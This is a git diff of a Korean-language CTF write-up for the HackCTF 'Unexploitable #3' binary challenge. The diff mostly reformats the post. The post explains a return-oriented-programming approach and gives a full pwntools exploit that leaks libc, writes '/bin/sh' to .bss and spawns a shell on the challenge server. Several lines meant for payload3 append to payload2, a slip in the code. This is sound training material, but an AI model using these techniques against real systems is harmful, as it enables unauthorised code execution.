@@ -7,11 +7,6 @@ tags:   [HackCTF]
 categories: [Write-up]
 ---
 
-# [HackCTF] Unexploitable #3
-
-Date: Feb 03, 2020
-Tags: report
-
 
 ### 1.  문제
 
@@ -23,14 +18,14 @@ Tags: report
 
 NX비트말곤 딱히 걸려있는게 없다.
 
-
+<br>
 **2) 문제 확인**
 
 ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Unexploitable%203/Untitled%201.png)
 
 Unexploitable 의 3번째 문제로서 동일한게 한번 입력을 받고 종료된다.
 
-
+<br>
 **3) 코드흐름 파악**
 
 ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Unexploitable%203/Untitled%202.png)
@@ -45,7 +40,7 @@ Unexploitable 의 3번째 문제로서 동일한게 한번 입력을 받고 종�
 
 요렇게 되어있다. 어떻게 사용하면 될지 일단 차차 생각해보자.
 
-
+<br><br>
 
 ### 2. 접근방법
 
@@ -61,6 +56,7 @@ fgets로 충분히 리턴주소를 덮을수 있다. 그렇다면 fwrite를 이�
 
 현재 가젯에 pop rdi; ret; 는 존재하기 때문에 먼저 rdi에 원하는 값을 넣고, gitf 함수의 가젯을 이용하면 rcx에 아까 넣어둔 rdi 값이 들어갈 것이다.
 
+<br>
 
 - **첫번째 시나리오**
     1. pop rbp; ret; 를 이용해서 .bss 영역에 /bin/sh 저장하기
@@ -79,7 +75,11 @@ pop rbp; ret; 를 이용하여 bss 영역에 "/bin/sh" 문자열을 잘 저장�
 
 하지만 현재 rcx에 stdout_got가 들어가 있긴 하지만, "pop rbp;ret;" 가 진행되고 setvbuf, fwrite, 함수를 건너뛰고 바로 main+98로 다시 갔기 때문에 stdout이 한번도 사용되지 않아 got에 실 주소가 들어가있지 않고 위 사진처럼 0x400743주소가 들어가 있다.
 
+<br>
+
 따라서 " call [r12 + rbx*8] " 이 실행됬을 때 에러가 나는 것이다. 결국 다른 시나리오를 이용해야한다.
+
+<br>
 
 - **두번째 시나리오**
     1. 바로 libc 주소 leak하기
@@ -90,86 +90,86 @@ pop rbp; ret; 를 이용하여 bss 영역에 "/bin/sh" 문자열을 잘 저장�
 
 두번째 시나리오대로 코드를 짜면 정상적으로 쉘이 떨어진다.
 
-
+<br><br><br>
 
 ### 3. 풀이
 
 ---
 
 최종익스코드는 다음과 같다
+```python
+from pwn import *
+context.log_level="DEBUG"
+p=remote("ctf.j0n9hyun.xyz",3034)
+#p=process("./Unexploitable_3")
+e=ELF("./Unexploitable_3")
+#gdb.attach(p)
 
-    from pwn import *
-    context.log_level="DEBUG"
-    p=remote("ctf.j0n9hyun.xyz",3034)
-    #p=process("./Unexploitable_3")
-    e=ELF("./Unexploitable_3")
-    #gdb.attach(p)
-    
-    bss=0x601038
-    
-    gadget_1=0x40073A # pop rbx,rbp,r12,r13,r14,r15,ret;
-    gadget_2=0x400720 # mov rdx,r13; mov rsi,r14; mov esi,r15d; call [r12+rbx*8]; add rbx,1; cmp rbx,rbp 
-    gadget_3=0x400658 # mov rcx,[rdi]; ret;
-    gadget_4=0x400743 # pop rdi; ret;
-    
-    p.recvuntil("you!\n")
-    
-    payload2 = "A"*0x18
-    payload2 += p64(gadget_4)
-    payload2 += p64(0x601050) # for rcx
-    payload2 += p64(gadget_3)
-    payload2 += p64(gadget_1)
-    payload2 += p64(0) # rbx
-    payload2 += p64(1) # rbp
-    payload2 += p64(e.got['fwrite']) # r12
-    payload2 += p64(6) # r13
-    payload2 += p64(1) # r14
-    payload2 += p64(e.got['fwrite']) # r15
-    payload2 += p64(gadget_2)
-    payload2 += p64(0)
-    payload2 += p64(0) #rbx
-    payload2 += p64(1) #rbp
-    payload2 += p64(0) #r12
-    payload2 += p64(0) #r13
-    payload2 += p64(0)  #r14
-    payload2 += p64(0) #r15
-    payload2 += p64(0x40065f)
-    pause()
-    p.sendline(payload2)
-    
-    fwrite_addr=u64(p.recv(6)+"\x00\x00")
-    log.info(hex(fwrite_addr))
-    libc_base=fwrite_addr-0x06e6e0
-    
-    payload3 = "A"*0x18
-    payload2 += p64(gadget_4)
-    payload2 += p64(0x601060) # for rcx
-    payload2 += p64(gadget_3)
-    payload3 += p64(gadget_1)
-    payload3 += p64(0) # rbx
-    payload3 += p64(1) # rbp
-    payload3 += p64(e.got['fgets']) # r12
-    payload3 += p64(libc_base+0x3c48e0) # r13
-    payload3 += p64(8) # r14
-    payload3 += p64(bss) # r15
-    payload3 += p64(gadget_2)
-    payload3 += p64(0)
-    payload3 += p64(0) #rbx
-    payload3 += p64(1) #rbp
-    payload3 += p64(0) #r12
-    payload3 += p64(0) #r13
-    payload3 += p64(0) #r14
-    payload3 += p64(0) #r15
-    payload3 += p64(gadget_4)
-    payload3 += p64(bss)
-    payload3 += p64(libc_base+0x045390)
-    
-    p.recvuntil("you!\n")
-    p.sendline(payload3)
-    p.send("/bin/sh\x00")
-    p.interactive()
+bss=0x601038
 
+gadget_1=0x40073A # pop rbx,rbp,r12,r13,r14,r15,ret;
+gadget_2=0x400720 # mov rdx,r13; mov rsi,r14; mov esi,r15d; call [r12+rbx*8]; add rbx,1; cmp rbx,rbp 
+gadget_3=0x400658 # mov rcx,[rdi]; ret;
+gadget_4=0x400743 # pop rdi; ret;
 
+p.recvuntil("you!\n")
+
+payload2 = "A"*0x18
+payload2 += p64(gadget_4)
+payload2 += p64(0x601050) # for rcx
+payload2 += p64(gadget_3)
+payload2 += p64(gadget_1)
+payload2 += p64(0) # rbx
+payload2 += p64(1) # rbp
+payload2 += p64(e.got['fwrite']) # r12
+payload2 += p64(6) # r13
+payload2 += p64(1) # r14
+payload2 += p64(e.got['fwrite']) # r15
+payload2 += p64(gadget_2)
+payload2 += p64(0)
+payload2 += p64(0) #rbx
+payload2 += p64(1) #rbp
+payload2 += p64(0) #r12
+payload2 += p64(0) #r13
+payload2 += p64(0)  #r14
+payload2 += p64(0) #r15
+payload2 += p64(0x40065f)
+pause()
+p.sendline(payload2)
+
+fwrite_addr=u64(p.recv(6)+"\x00\x00")
+log.info(hex(fwrite_addr))
+libc_base=fwrite_addr-0x06e6e0
+
+payload3 = "A"*0x18
+payload2 += p64(gadget_4)
+payload2 += p64(0x601060) # for rcx
+payload2 += p64(gadget_3)
+payload3 += p64(gadget_1)
+payload3 += p64(0) # rbx
+payload3 += p64(1) # rbp
+payload3 += p64(e.got['fgets']) # r12
+payload3 += p64(libc_base+0x3c48e0) # r13
+payload3 += p64(8) # r14
+payload3 += p64(bss) # r15
+payload3 += p64(gadget_2)
+payload3 += p64(0)
+payload3 += p64(0) #rbx
+payload3 += p64(1) #rbp
+payload3 += p64(0) #r12
+payload3 += p64(0) #r13
+payload3 += p64(0) #r14
+payload3 += p64(0) #r15
+payload3 += p64(gadget_4)
+payload3 += p64(bss)
+payload3 += p64(libc_base+0x045390)
+
+p.recvuntil("you!\n")
+p.sendline(payload3)
+p.send("/bin/sh\x00")
+p.interactive()
+```
+<br><br>
 
 ### 4. 몰랐던 개념
 
